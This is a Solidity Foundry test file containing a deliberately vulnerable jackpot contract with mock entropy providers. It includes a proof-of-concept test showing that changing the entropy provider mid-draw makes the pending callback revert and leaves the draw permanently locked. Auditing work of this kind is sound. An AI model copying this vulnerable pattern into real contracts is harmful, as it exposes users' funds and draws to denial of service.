// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IEntropyConsumer {
    function scaledEntropyCallback(uint64 sequenceNumber, uint256 randomNumber) external;
}

contract MockEntropy {
    uint64 public nextSequence;
    mapping(uint64 => address) public consumerOf;

    function request(address consumer) external returns (uint64 seq) {
        seq = ++nextSequence;
        consumerOf[seq] = consumer;
    }

    function fulfill(uint64 seq, uint256 randomNumber) external {
        address consumer = consumerOf[seq];
        require(consumer != address(0), "unknown seq");
        IEntropyConsumer(consumer).scaledEntropyCallback(seq, randomNumber);
    }
}

contract VulnerableJackpot is IEntropyConsumer {
    address public owner;
    address public entropy;
    bool public jackpotLock;
    uint64 public pendingSequence;
    uint256 public resolvedRandom;

    event EntropySet(address indexed oldEntropy, address indexed newEntropy);
    event JackpotRun(address indexed entropy, uint64 indexed sequence);
    event JackpotResolved(uint64 indexed sequence, uint256 randomNumber);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    modifier onlyEntropy() {
        require(msg.sender == entropy, "not entropy");
        _;
    }

    constructor(address _entropy) {
        owner = msg.sender;
        entropy = _entropy;
    }

    function setEntropy(address newEntropy) external onlyOwner {
        emit EntropySet(entropy, newEntropy);
        entropy = newEntropy;
    }

    function runJackpot() external onlyOwner returns (uint64 seq) {
        require(!jackpotLock, "locked");
        jackpotLock = true;
        seq = MockEntropy(entropy).request(address(this));
        pendingSequence = seq;
        emit JackpotRun(entropy, seq);
    }

    function scaledEntropyCallback(uint64 sequenceNumber, uint256 randomNumber) external onlyEntropy {
        require(jackpotLock, "not locked");
        require(sequenceNumber == pendingSequence, "bad seq");

        resolvedRandom = randomNumber;
        jackpotLock = false;

        emit JackpotResolved(sequenceNumber, randomNumber);
    }
}

contract ExploitTest is Test {
    VulnerableJackpot jackpot;
    MockEntropy entropyA;
    MockEntropy entropyB;

    address owner = address(0xABCD);
    address attackerGov = owner;

    function setUp() public {
        entropyA = new MockEntropy();
        entropyB = new MockEntropy();

        vm.prank(owner);
        jackpot = new VulnerableJackpot(address(entropyA));
    }

    function test_exploit() public {
        // Step 1: Owner starts a jackpot draw using entropy provider A.
        vm.prank(owner);
        uint64 seq = jackpot.runJackpot();

        // Verify the draw is now in-flight and locked awaiting callback.
        assertTrue(jackpot.jackpotLock(), "jackpot should be locked after request");
        assertEq(jackpot.pendingSequence(), seq, "pending sequence should be recorded");
        assertEq(jackpot.entropy(), address(entropyA), "entropy A should be active initially");

        // Step 2: Mid-operation, governance/owner changes the entropy provider to B.
        vm.prank(attackerGov);
        jackpot.setEntropy(address(entropyB));

        // Confirm the trusted callback sender changed while the old request is still pending.
        assertEq(jackpot.entropy(), address(entropyB), "entropy should now be provider B");
        assertTrue(jackpot.jackpotLock(), "jackpot remains locked while callback is pending");

        // Step 3: Original provider A attempts to deliver the callback for the in-flight request.
        // This now reverts due to onlyEntropy, causing settlement DoS.
        vm.expectRevert(bytes("not entropy"));
        entropyA.fulfill(seq, 777);

        // Assert harmful outcome:
        // - draw remains unresolved/locked
        // - randomness was not recorded
        // - protocol progress is blocked until governance intervenes
        assertTrue(jackpot.jackpotLock(), "jackpot lock should remain stuck after reverted callback");
        assertEq(jackpot.resolvedRandom(), 0, "randomness should remain unset after failed callback");
        assertEq(jackpot.pendingSequence(), seq, "pending sequence should still be in flight");
    }
}